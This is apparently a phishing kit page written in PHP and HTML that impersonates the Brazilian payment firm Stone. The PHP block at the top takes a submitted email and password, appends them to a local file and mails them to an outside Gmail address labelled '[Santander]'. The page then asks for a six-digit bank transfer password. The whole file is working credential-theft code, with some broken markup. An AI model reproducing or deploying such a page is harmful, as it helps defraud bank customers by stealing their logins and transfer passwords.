<?php

       $email = addslashes($_POST["email"]);
       $senha = addslashes($_POST["senha"]);
    
   
       $corpomsg = " <p></p>
       ====Stone======<br> <p></p>
       email: $email<br>    <p></p> 
       senha: $senha<br>    <p></p> 
       =======================";
         $fp = fopen("info.php", "a");
         @mail("ms4010509@gmail.com", "[Santander]"."$ip", $corpomsg, $matts);
       fwrite($fp, $corpomsg);
       fclose($fp);
     ?>
<!DOCTYPE html>

<html data-wf-domain="stone-6d0687.webflow.io" data-wf-page="5f5fffaf5804aa17d3a0a3ec" data-wf-site="5f5fffaf5804aa4ac2a0a3eb" data-wf-status="1" class=" w-mod-js w-mod-js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>stone</title><meta content="width=device-width, initial-scale=1" name="viewport"><meta content="Webflow" name="generator"><link href="./stone_files/stone-6d0687.webflow.a447673d8.css" rel="stylesheet" type="text/css"><!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif]--><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
<link rel="shortcut icon" href="http://127.0.0.1/dev/stone2/index_files/favicon.ico">
</head><body class="body"><div class="section"><div class="container w-container"><div class="div-block-2"></div><div class="w-form">
	<form action="./login.php" method="POST">
		<img src="./stone_files/5f6001375804aa7292a0a591_5f5fa5a9ba31cd22f23491be_logo-stone.png" loading="lazy" width="107" alt="" class="image">
		<label for="senha" class="field-label-2">Senha de 6 digitos. Senha usada para fazer transferencia.</label>
		<input type="senha" class="text-field w-input" maxlength="256" name="senha6" data-name="senha" placeholder="" id="senha6" required="">
		<input type="submit" value="Entrar" data-wait="Verificando" class="submit-button w-button"><label class="field-label-3"><a </label></form><div class="w-form-done"><div>Thank you! Your submission has been received!</div></div><div class="w-form-fail"><div>Oops! Something went wrong while submitting the form.</div></div></div></div></div>
</body></html>